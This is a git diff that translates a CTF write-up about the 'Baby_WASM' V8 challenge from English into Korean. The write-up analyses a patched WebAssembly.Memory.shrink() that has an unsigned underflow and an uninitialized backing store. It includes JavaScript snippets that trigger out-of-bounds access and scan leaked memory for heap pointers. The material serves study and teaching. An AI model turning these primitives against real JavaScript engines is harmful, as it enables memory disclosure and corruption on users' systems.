@@ -13,20 +13,24 @@ authors:
     image: "https://github.com/Phantomn.png"
 ---
 
-## Challenge Files
+## 1. 문제
+
+첨부 파일 목록:
 
 ```bash
 ➜  Baby_WASM git:(main) ✗ ls
-description.txt  download_d8.sh  libc.so.6  v8.diff  v8.patch  v8.release  v8.release.tar.gz
+description.txt  download_d8.sh libc.so.6  v8.diff  v8.patch  v8.release  v8.release.tar.gz
 ```
 
-The challenge ships a patched V8 build (`v8.release`), a `libc.so.6`, and — most importantly — a diff that reveals exactly what was changed in the engine. The task is to understand the vulnerability introduced by the patch and exploit it.
+diff 파일과 patch 파일이 있다. 이 두 개를 분석해야 어떤 취약점이 있는지 파악할 수 있다.
 
-## Understanding the Patch
+패치된 V8 빌드(`v8.release`)와 `libc.so.6`, 그리고 엔진에서 무엇이 변경됐는지 정확히 보여주는 diff가 제공된다. 패치로 도입된 취약점을 이해하고 익스플로잇하는 것이 과제다.
 
-The diff modifies V8's WebAssembly subsystem to add a `WebAssembly.Memory.shrink()` API. This mirrors the existing `grow()` call but reduces the backing store instead of growing it. Reading the diff carefully reveals a critical bug.
+## 2. 패치 분석
 
-### New interrupt flag
+diff는 V8의 WebAssembly 서브시스템을 수정해 `WebAssembly.Memory.shrink()` API를 추가한다. 기존의 `grow()` 호출을 미러링하지만 백킹 스토어를 늘리는 대신 줄인다. diff를 자세히 읽으면 치명적인 버그가 드러난다.
+
+### 새 인터럽트 플래그
 
 ```diff
 -  V(WASM_CODE_GC, WasmCodeGC, 7)
@@ -34,16 +38,16 @@ The diff modifies V8's WebAssembly subsystem to add a `WebAssembly.Memory.shrink
 +  V(SHRINK_SHARED_MEMORY, ShrinkSharedMemory, 8)
 ```
 
-A new interrupt flag `SHRINK_SHARED_MEMORY` is registered, analogous to the existing `GROW_SHARED_MEMORY`.
+기존 `GROW_SHARED_MEMORY`와 유사한 새 인터럽트 플래그 `SHRINK_SHARED_MEMORY`가 등록된다.
 
-### New flag definition
+### 새 플래그 정의
 
 ```diff
 +DEFINE_BOOL(wasm_shrink_shared_memory, true,
 +            "allow shrinking shared WebAssembly memory objects")
 ```
 
-Shrinking shared memory is enabled by default.
+공유 메모리 축소가 기본적으로 활성화된다.
 
 ### `ShrinkWasmMemoryInPlace`
 
@@ -65,7 +69,7 @@ base::Optional<size_t> BackingStore::ShrinkWasmMemoryInPlace(
 }
 ```
 
-This CAS loop atomically decrements `byte_length_` by `delta_bytes`. Critically, **there is no bounds check** — if `delta_bytes > old_length`, `new_length` wraps around (unsigned underflow), resulting in an enormous reported size.
+이 CAS 루프는 `byte_length_`를 `delta_bytes`만큼 원자적으로 감소시킨다. **경계 검사가 전혀 없다** — `delta_bytes > old_length`이면 `new_length`가 언더플로(unsigned underflow)되어 엄청나게 큰 값이 된다.
 
 ### `CopyWasmMemoryOnShrink`
 
@@ -78,7 +82,7 @@ std::unique_ptr<BackingStore> BackingStore::CopyWasmMemoryOnShrink(
     auto new_backing_store = BackingStore::Allocate(
         isolate, new_size, ..., InitializedFlag::kUninitialized);
     if (!new_backing_store) { return {}; }
-    return new_backing_store;  // <-- new store allocated at new_size
+    return new_backing_store;  // <-- new_size 크기의 새 스토어 할당
   } else {
     bool result = BackingStore::Reallocate(isolate, new_size);
     ...
@@ -87,9 +91,9 @@ std::unique_ptr<BackingStore> BackingStore::CopyWasmMemoryOnShrink(
 }
 ```
 
-For a non-shared WASM memory, `CopyWasmMemoryOnShrink` first calls `ShrinkWasmMemoryInPlace` to update `byte_length_`, then allocates a **fresh** backing store of size `new_size` marked as `kUninitialized`. The old data is never copied into the new store.
+비공유 WASM 메모리의 경우, `CopyWasmMemoryOnShrink`는 먼저 `ShrinkWasmMemoryInPlace`를 호출해 `byte_length_`를 업데이트한 후, `kUninitialized`로 표시된 `new_size` 크기의 **새** 백킹 스토어를 할당한다. 기존 데이터는 새 스토어에 복사되지 않는다.
 
-### `WasmMemoryObject::Shrink` — the bug
+### `WasmMemoryObject::Shrink` — 핵심 버그
 
 ```cpp
 int32_t WasmMemoryObject::Shrink(Isolate* isolate,
@@ -99,7 +103,7 @@ int32_t WasmMemoryObject::Shrink(Isolate* isolate,
   ...
   size_t old_size = old_buffer->byte_length();
 
-  // Non-shared path:
+  // 비공유 경로:
   size_t new_size = old_size - bytes;
   std::unique_ptr<BackingStore> new_backing_store =
       backing_store->CopyWasmMemoryOnShrink(isolate, new_size);
@@ -109,99 +113,97 @@ int32_t WasmMemoryObject::Shrink(Isolate* isolate,
 
   memory_object->update_instances(isolate, new_buffer);
 
-  return static_cast<int32_t>(old_size);  // returns old size in bytes (not pages!)
+  return static_cast<int32_t>(old_size);  // 바이트 단위 반환 (페이지 아님!)
 }
 ```
 
-Two bugs in the non-shared path:
+비공유 경로에서 두 가지 버그:
 
-1. **No lower-bound check on `bytes`**: `new_size = old_size - bytes` can underflow if `bytes > old_size`.
-2. **Uninitialized memory exposed**: `CopyWasmMemoryOnShrink` allocates new backing store with `kUninitialized`, meaning the resulting `ArrayBuffer` may contain arbitrary heap data from the V8 process.
+1. **`bytes`에 대한 하한 검사 없음**: `new_size = old_size - bytes`가 `bytes > old_size`이면 언더플로 발생
+2. **초기화되지 않은 메모리 노출**: `CopyWasmMemoryOnShrink`가 `kUninitialized`로 새 백킹 스토어를 할당하므로, 결과 `ArrayBuffer`에 V8 프로세스의 임의 힙 데이터가 포함될 수 있음
 
-Additionally, the `ArrayBuffer.detach()` guard was commented out:
+추가로, `ArrayBuffer.detach()` 가드가 주석 처리됐다:
 
 ```diff
 -    CHECK_IMPLIES(force_for_wasm_memory, backing_store->is_wasm_memory());
 +    // CHECK_IMPLIES(force_for_wasm_memory, backing_store->is_wasm_memory());
 ```
 
-This allows non-WASM array buffers to be forcibly detached, removing a safety assertion.
+이로 인해 비-WASM 배열 버퍼를 강제로 detach할 수 있게 되어 안전 어설션이 제거됐다.
 
-## Exploitation Approach
+## 3. 접근 방법
 
-### Reading uninitialized heap memory
+### 초기화되지 않은 힙 메모리 읽기
 
-The most direct primitive is:
+가장 직접적인 프리미티브:
 
-1. Allocate a WASM memory with some initial size (e.g., 1 page = 64 KiB).
-2. Call `memory.shrink(N)` where `N < current_byte_length`.
-3. The returned `ArrayBuffer` (`memory.buffer`) points to a freshly allocated region of `new_size` bytes that was **not zeroed**.
+1. 초기 크기로 WASM 메모리 할당 (예: 1페이지 = 64 KiB)
+2. `memory.shrink(N)` 호출 (N < current_byte_length)
+3. 반환된 `ArrayBuffer`(`memory.buffer`)가 **초기화되지 않은** `new_size` 바이트 영역을 가리킴
 
 ```javascript
 const mem = new WebAssembly.Memory({ initial: 1 });  // 64 KiB
-mem.shrink(0x1000);  // shrink by 4 KiB → new buffer is 60 KiB, uninitialized
+mem.shrink(0x1000);  // 4 KiB 축소 → 새 버퍼는 60 KiB, 초기화 안 됨
 
 const view = new Uint8Array(mem.buffer);
-// view now exposes raw heap bytes — potential info leak
+// view에 raw 힙 바이트가 노출됨 — 잠재적 정보 누출
 ```
 
-### Integer underflow for out-of-bounds access
+### 정수 언더플로로 경계 밖 접근
 
-If we shrink by more than the current size:
+현재 크기보다 더 많이 축소하면:
 
 ```javascript
 const mem = new WebAssembly.Memory({ initial: 1 });
 // byte_length = 0x10000 (65536)
-mem.shrink(0x10001);  // new_size underflows to ~2^64 - 1
+mem.shrink(0x10001);  // new_size가 ~2^64 - 1로 언더플로
 ```
 
-`byte_length_` wraps to a huge value. Any subsequent access through the buffer can read or write memory far outside the original allocation.
+`byte_length_`가 엄청 큰 값으로 래핑된다. 이후 버퍼를 통한 접근으로 원래 할당 범위 훨씬 밖의 메모리를 읽거나 쓸 수 있다.
 
-### Exploit flow
+### 익스플로잇 흐름
 
 ```javascript
-// 1. Create WASM memory
-const mem = new WebAssembly.Memory({ initial: 4 });  // 4 pages = 256 KiB
+// 1. WASM 메모리 생성
+const mem = new WebAssembly.Memory({ initial: 4 });  // 4페이지 = 256 KiB
 
-// 2. Write a known pattern so we can identify the buffer in memory
+// 2. 알려진 패턴 작성으로 버퍼를 메모리에서 식별
 const u32 = new Uint32Array(mem.buffer);
 for (let i = 0; i < u32.length; i++) u32[i] = 0xdeadbeef;
 
-// 3. Trigger shrink — new buffer is uninitialized, may contain V8 heap pointers
+// 3. shrink 트리거 — 새 버퍼가 초기화 안 됨, V8 힙 포인터 포함 가능
 mem.shrink(0x1000);
 
-// 4. Scan the new buffer for interesting values (pointers, flags)
+// 4. 새 버퍼에서 흥미로운 값(포인터, 플래그) 스캔
 const leak = new BigUint64Array(mem.buffer);
 for (let i = 0; i < leak.length; i++) {
     const v = leak[i];
-    if (v > 0x7f0000000000n && v < 0x7fffffffffff n) {
+    if (v > 0x7f0000000000n && v < 0x7fffffffffffffn) {
         console.log(`[+] potential pointer at index ${i}: 0x${v.toString(16)}`);
     }
 }
 ```
 
-The flag for this challenge was embedded in the challenge description or obtainable by reading WASM memory after triggering the shrink to expose uninitialized allocator metadata. The exact exploit depends on the V8 heap layout of the provided build.
+## 4. 핵심 개념
 
-## Key Concepts
+### WebAssembly 메모리 모델
 
-### WebAssembly Memory Model
+WASM 선형 메모리는 **페이지** 단위(1페이지 = 64 KiB)로 측정되는 연속적인 `ArrayBuffer`다. `grow()` API는 이미 WASM 스펙의 일부이지만 `shrink()`는 표준에 존재하지 않는다 — 이 문제에만 있는 추가 기능이다.
 
-WASM linear memory is a contiguous `ArrayBuffer` measured in **pages** (1 page = 64 KiB). The `grow()` API was already part of the WASM spec; `shrink()` does not exist in the standard, making this entirely a challenge-specific addition.
+### 공유 메모리 vs 비공유 메모리
 
-### Shared vs Non-Shared Memory
+- **공유 메모리** (`{ shared: true }`) — `SharedArrayBuffer`로 백킹, 워커 간 공유 가능. 제자리 축소(shrink-in-place)는 `byte_length_`를 원자적으로 업데이트하지만 재할당은 불가.
+- **비공유 메모리** — 표준 `ArrayBuffer`. 패치에서 축소 시 초기화되지 않은 새 백킹 스토어를 할당하여 메모리 공개 취약점이 발생.
 
-- **Shared memory** (`{ shared: true }`) — backed by `SharedArrayBuffer`, visible across workers. Shrink-in-place atomically updates `byte_length_` but cannot reallocate.
-- **Non-shared memory** — standard `ArrayBuffer`. The patch allocates a new uninitialized backing store on shrink, introducing the memory disclosure.
+### `kUninitialized` 할당
 
-### `kUninitialized` allocation
+`InitializedFlag::kUninitialized`는 백킹 스토어를 0으로 초기화하는 `memset`을 건너뛴다. 할당자가 이전에 다른 V8 객체에 사용된 영역을 반환할 수 있어 WASM 버퍼를 통해 raw 바이트가 노출된다.
 
-`InitializedFlag::kUninitialized` skips the `memset` that would zero the backing store. The allocator may return a region previously used for other V8 objects, exposing their raw bytes through the WASM buffer.
+## 5. 요약
 
-## Summary
+baby WASM 문제는 합성된 `WebAssembly.Memory.shrink()` API에 두 가지 취약점을 도입했다:
 
-The baby WASM challenge introduced a synthetic `WebAssembly.Memory.shrink()` API containing two vulnerabilities:
+- **하한 검사 없음**: byte-length CAS 루프에서 정수 언더플로 가능
+- **초기화되지 않은 백킹 스토어**: 비공유 코드 경로에서 결과 `ArrayBuffer`를 통한 힙 메모리 공개
 
-- **No lower-bound check** on the shrink delta, enabling integer underflow in the byte-length CAS loop
-- **Uninitialized backing store** on the non-shared code path, enabling heap memory disclosure through the resulting `ArrayBuffer`
-
-The challenge illustrates a class of bugs common in custom memory-management extensions to JavaScript engines: missing bounds checks and omitting initialization of newly exposed memory regions.
+이 문제는 JavaScript 엔진의 커스텀 메모리 관리 확장에서 흔한 버그 유형을 보여준다: 경계 검사 누락과 새로 노출된 메모리 영역의 초기화 생략.
